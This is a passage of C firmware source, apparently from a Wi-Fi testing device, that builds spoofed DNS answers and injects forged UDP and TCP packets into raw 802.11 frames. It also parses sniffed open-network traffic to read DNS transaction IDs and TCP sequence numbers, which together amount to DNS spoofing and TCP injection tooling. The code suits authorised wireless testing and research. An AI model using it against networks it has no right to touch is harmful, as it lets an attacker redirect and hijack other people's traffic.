    tcp[12] = 0x50; // data offset 5 words, no options
    tcp[13] = flags;
    l3_put_u16(tcp + 14, 64240);
    l3_put_u16(tcp + 16, 0);
    l3_put_u16(tcp + 18, 0);
    memcpy(tcp + 20, payload, payloadLen);

    uint32_t acc = l4_pseudo_sum(srcIp, dstIp, 6, (uint16_t)l4Len);
    acc = l4_partial_sum(tcp, l4Len, acc);
    l3_put_u16(tcp + 16, l4_finish(acc));
    return total;
}

size_t wifi_build_dns_response(
    uint8_t *out, size_t cap, uint16_t txid, const char *domain, const char *answerIp, uint32_t ttl
) {
    if (out == NULL || domain == NULL || answerIp == NULL) return 0;

    uint8_t answer[4];
    int octets[4] = {0, 0, 0, 0};
    int field = 0, digits = 0;
    for (const char *p = answerIp; *p != '\0'; p++) {
        if (*p == '.') {
            if (digits == 0 || field >= 3) return 0;
            field++;
            digits = 0;
            continue;
        }
        if (*p < '0' || *p > '9' || digits >= 3) return 0;
        octets[field] = octets[field] * 10 + (*p - '0');
        if (octets[field] > 255) return 0;
        digits++;
    }
    if (field != 3 || digits == 0) return 0;
    for (int i = 0; i < 4; i++) answer[i] = (uint8_t)octets[i];

    // Header: response, recursion available, one question, one answer.
    size_t pos = 0;
    if (cap < 12) return 0;
    l3_put_u16(out, txid);
    l3_put_u16(out + 2, 0x8180);
    l3_put_u16(out + 4, 1);
    l3_put_u16(out + 6, 1);
    l3_put_u16(out + 8, 0);
    l3_put_u16(out + 10, 0);
    pos = 12;

    const char *label = domain;
    while (*label != '\0') {
        const char *dot = strchr(label, '.');
        size_t labelLen = (dot != NULL) ? (size_t)(dot - label) : strlen(label);
        if (labelLen == 0 || labelLen > 63) return 0;
        if (pos + 1 + labelLen + 5 > cap) return 0;
        out[pos++] = (uint8_t)labelLen;
        memcpy(out + pos, label, labelLen);
        pos += labelLen;
        if (dot == NULL) break;
        label = dot + 1;
    }
    out[pos++] = 0x00;

    l3_put_u16(out + pos, 1); // QTYPE A
    l3_put_u16(out + pos + 2, 1); // QCLASS IN
    pos += 4;

    if (pos + 16 > cap) return 0;
    out[pos++] = 0xC0; // name pointer to the question
    out[pos++] = 0x0C;
    l3_put_u16(out + pos, 1);
    l3_put_u16(out + pos + 2, 1);
    l3_put_u32(out + pos + 4, ttl);
    pos += 8;
    l3_put_u16(out + pos, 4);
    pos += 2;
    memcpy(out + pos, answer, 4);
    pos += 4;
    return pos;
}

WifiL4Result wifi_inject_udp(
    const uint8_t dstMac[6], const uint8_t bssid[6], uint32_t srcIp, uint32_t dstIp, uint16_t srcPort,
    uint16_t dstPort, const uint8_t *payload, size_t payloadLen, uint8_t channel, uint8_t repeat, uint32_t gapMs
) {
    WifiL4Result res = {};
    res.channel = channel;

    if (payload == NULL || payloadLen == 0) {
        res.error = "payload is empty";
        return res;
    }
    if (payloadLen > WIFI_L4_MAX_PAYLOAD) {
        res.error = "payload too large (max 1400 bytes)";
        return res;
    }

    size_t packetLen = build_ipv4_udp(l4Packet, sizeof(l4Packet), srcIp, dstIp, srcPort, dstPort, payload, payloadLen);
    if (packetLen == 0) {
        res.error = "failed to build the IP packet";
        return res;
    }

    l4SeqNum = (uint8_t)(l4SeqNum + 1);
    size_t frameLen = build_data_frame(l4Frame, sizeof(l4Frame), dstMac, bssid, l4Packet, packetLen);
    if (frameLen == 0) {
        res.error = "frame too large";
        return res;
    }

    res.payloadLen = (int)payloadLen;
    res.len = (int)frameLen;

    // Deliberately no cleanlyStopWebUiForWiFiFeature() here: scripts may send
    // hundreds of these and wifi_raw_inject() already brings the radio up.
    WifiRawTxResult tx = wifi_raw_inject(l4Frame, frameLen, channel, repeat, -1, false, gapMs);
    res.ok = tx.ok;
    res.frames = tx.sent;
    res.error = tx.error;
    return res;
}

WifiL4Result wifi_inject_tcp(
    const uint8_t dstMac[6], const uint8_t bssid[6], uint32_t srcIp, uint32_t dstIp, uint16_t srcPort,
    uint16_t dstPort, uint32_t seq, uint32_t ack, uint8_t flags, const uint8_t *payload, size_t payloadLen,
    uint8_t channel, uint8_t repeat, uint32_t gapMs
) {
    WifiL4Result res = {};
    res.channel = channel;

    if (payload == NULL || payloadLen == 0) {
        res.error = "payload is empty";
        return res;
    }
    if (payloadLen > WIFI_L4_MAX_PAYLOAD) {
        res.error = "payload too large (max 1400 bytes)";
        return res;
    }

    size_t packetLen =
        build_ipv4_tcp(l4Packet, sizeof(l4Packet), srcIp, dstIp, srcPort, dstPort, seq, ack, flags, payload, payloadLen);
    if (packetLen == 0) {
        res.error = "failed to build the IP packet";
        return res;
    }

    l4SeqNum = (uint8_t)(l4SeqNum + 1);
    size_t frameLen = build_data_frame(l4Frame, sizeof(l4Frame), dstMac, bssid, l4Packet, packetLen);
    if (frameLen == 0) {
        res.error = "frame too large";
        return res;
    }

    res.payloadLen = (int)payloadLen;
    res.len = (int)frameLen;

    WifiRawTxResult tx = wifi_raw_inject(l4Frame, frameLen, channel, repeat, -1, false, gapMs);
    res.ok = tx.ok;
    res.frames = tx.sent;
    res.error = tx.error;
    return res;
}

// Decodes a dotted quad. Used by the JS layer for srcIp / dstIp / answerIp.
bool wifi_parse_ipv4(const char *s, uint32_t *out) {
    if (s == NULL || out == NULL) return false;
    uint32_t value = 0;
    int field = 0, digits = 0, octet = 0;
    for (const char *p = s; *p != '\0'; p++) {
        if (*p == '.') {
            if (digits == 0 || field >= 3) return false;
            value = (value << 8) | (uint32_t)octet;
            field++;
            digits = 0;
            octet = 0;
            continue;
        }
        if (*p < '0' || *p > '9' || digits >= 3) return false;
        octet = octet * 10 + (*p - '0');
        if (octet > 255) return false;
        digits++;
    }
    if (field != 3 || digits == 0) return false;
    *out = (value << 8) | (uint32_t)octet;
    return true;
}

bool wifi_parse_frame(const uint8_t *frame, size_t len, WifiParsedFrame *out) {
    if (out == NULL) return false;
    memset(out, 0, sizeof(*out));

    if (frame == NULL || len < 10) {
        out->error = "frame too short to be 802.11";
        return false;
    }

    uint16_t fc = (uint16_t)(frame[0] | (frame[1] << 8));
    out->type = (uint8_t)((fc >> 2) & 0x03);
    out->subtype = (uint8_t)((fc >> 4) & 0x0F);
    out->protectedFrame = (fc & 0x4000) != 0;
    out->toDs = (fc & 0x0100) != 0;
    out->fromDs = (fc & 0x0200) != 0;

    if (len < 24) {
        out->error = "truncated 802.11 header";
        return false;
    }
    memcpy(out->addr1, frame + 4, 6);
    memcpy(out->addr2, frame + 10, 6);
    memcpy(out->addr3, frame + 16, 6);

    if (out->type != 2) { // management / control frames stop here
        out->valid = true;
        return true;
    }

    size_t hdr = 24;
    if (out->subtype & 0x08) hdr += 2; // QoS data
    if (out->toDs && out->fromDs) hdr += 6; // WDS

    if (out->protectedFrame) {
        out->error = "protected frame (WPA/WPA2): payload is encrypted";
        return false;
    }
    if (len < hdr + 8) {
        out->error = "no LLC/SNAP header";
        return false;
    }
    if (frame[hdr] != 0xAA || frame[hdr + 1] != 0xAA || frame[hdr + 2] != 0x03) {
        out->error = "payload is not LLC/SNAP (IP traffic)";
        return false;
    }

    size_t pos = hdr + 8;
    if (len < pos + 20) {
        out->error = "no IPv4 header";
        return false;
    }
    const uint8_t *ip = frame + pos;
    size_t ihl = (size_t)(ip[0] & 0x0F) * 4;
    if ((ip[0] >> 4) != 4 || ihl < 20 || ip[9] == 0) {
        out->error = "not an IPv4 packet";
        return false;
    }

    out->hasIp = true;
    out->ipProto = ip[9];
    out->ipTotalLen = (uint16_t)((ip[2] << 8) | ip[3]);
    out->ipSrc = ((uint32_t)ip[12] << 24) | ((uint32_t)ip[13] << 16) | ((uint32_t)ip[14] << 8) | ip[15];
    out->ipDst = ((uint32_t)ip[16] << 24) | ((uint32_t)ip[17] << 16) | ((uint32_t)ip[18] << 8) | ip[19];

    size_t l4pos = pos + ihl;
    size_t l4avail = len - l4pos;

    if (out->ipProto == 17 && l4avail >= 8) {
        const uint8_t *udp = frame + l4pos;
        out->hasUdp = true;
        out->udpSrcPort = (uint16_t)((udp[0] << 8) | udp[1]);
        out->udpDstPort = (uint16_t)((udp[2] << 8) | udp[3]);

        size_t dnsLen = l4avail - 8;
        const uint8_t *dns = udp + 8;
        if ((out->udpSrcPort == 53 || out->udpDstPort == 53) && dnsLen >= 12) {
            out->hasDns = true;
            out->dnsTxId = (uint16_t)((dns[0] << 8) | dns[1]);
            out->dnsIsResponse = (dns[2] & 0x80) != 0;
            uint16_t qdCount = (uint16_t)((dns[4] << 8) | dns[5]);
            if (qdCount > 0) {
                size_t q = 12;
                size_t nameLen = 0;
                while (q < dnsLen && dns[q] != 0) {
                    uint8_t labelLen = dns[q];
                    if ((labelLen & 0xC0) != 0) break; // compression pointer
                    q++;
                    for (uint8_t i = 0; i < labelLen && q < dnsLen; i++) {
                        char c = (char)dns[q++];
                        if (nameLen < sizeof(out->dnsQName) - 2) {
                            if (c >= 'A' && c <= 'Z') c = (char)(c - 'A' + 'a');
                            out->dnsQName[nameLen++] = c;
                        }
                    }
                    if (nameLen < sizeof(out->dnsQName) - 2) out->dnsQName[nameLen++] = '.';
                }
                if (nameLen > 0 && out->dnsQName[nameLen - 1] == '.') nameLen--;
                out->dnsQName[nameLen] = '\0';
                if (q + 5 <= dnsLen) {
                    out->dnsQType = (uint16_t)((dns[q + 1] << 8) | dns[q + 2]);
                    out->dnsQClass = (uint16_t)((dns[q + 3] << 8) | dns[q + 4]);
                }
            }
        }
    } else if (out->ipProto == 6 && l4avail >= 20) {
        const uint8_t *tcp = frame + l4pos;
        out->hasTcp = true;
        out->tcpSrcPort = (uint16_t)((tcp[0] << 8) | tcp[1]);
        out->tcpDstPort = (uint16_t)((tcp[2] << 8) | tcp[3]);
        out->tcpSeq = ((uint32_t)tcp[4] << 24) | ((uint32_t)tcp[5] << 16) | ((uint32_t)tcp[6] << 8) | tcp[7];
        out->tcpAck = ((uint32_t)tcp[8] << 24) | ((uint32_t)tcp[9] << 16) | ((uint32_t)tcp[10] << 8) | tcp[11];
        out->tcpFlags = tcp[13];
    }

    out->valid = true;
    return true;
}
